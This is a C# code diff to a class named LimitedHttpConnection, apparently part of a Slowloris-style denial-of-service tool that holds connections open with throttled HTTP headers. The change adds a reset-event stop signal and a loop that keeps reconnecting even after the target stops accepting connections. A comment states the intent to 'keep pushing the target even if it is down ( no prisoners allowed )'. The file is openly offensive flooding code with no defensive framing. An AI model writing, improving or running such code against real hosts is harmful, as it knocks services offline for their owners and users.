@@ -6,15 +6,17 @@ using System.Text;
 internal class LimitedHttpConnection
 {
     private readonly TargetInfo _target;
+    private readonly AutoResetEvent _resetEvent;
 
     private Socket? socket;
     private ThrottledNetworkStream? stream;
 
-    volatile private bool _isFlooding = true;
+    public bool IsAlive => socket != null;
 
-    public LimitedHttpConnection(TargetInfo target)
+    public LimitedHttpConnection(TargetInfo target, AutoResetEvent resetEvent)
     {
         _target = target;
+        _resetEvent = resetEvent;
     }
 
     private async Task WriteAsync(string format, params object[] args)
@@ -59,7 +61,7 @@ internal class LimitedHttpConnection
             // set statistics state for that target to 'connected'
             Statistics.RecordConnectionEstablished(_target.host);
             // create throttled stream
-            stream = new(socket, _target);
+            stream = new(socket, _target, _resetEvent);
             // send out throttled http headers
             await SendHeadersAsync();
         }
@@ -79,11 +81,18 @@ internal class LimitedHttpConnection
 
     public async Task FloodHost()
     {
-        _isFlooding = true;
-        while (_isFlooding)
+        while (!_resetEvent.WaitOne(1))
         {
-            await ConnectAsync();
-            while (socket is not null && socket.Connected && _isFlooding)
+            try
+            {
+                // throws exception when target is in fact down
+                // and refuses connections. We want to keep
+                // pushing the target even if it is down
+                // ( no prisoners allowed )
+                await ConnectAsync();
+            }
+            catch { continue; }
+            while (socket is not null && socket.Connected && !_resetEvent.WaitOne(1))
             {
                 try 
                 {
@@ -101,6 +110,6 @@ internal class LimitedHttpConnection
 
     public void Stop()
     {
-        _isFlooding = false;
+        _resetEvent.Set();
     }
 }
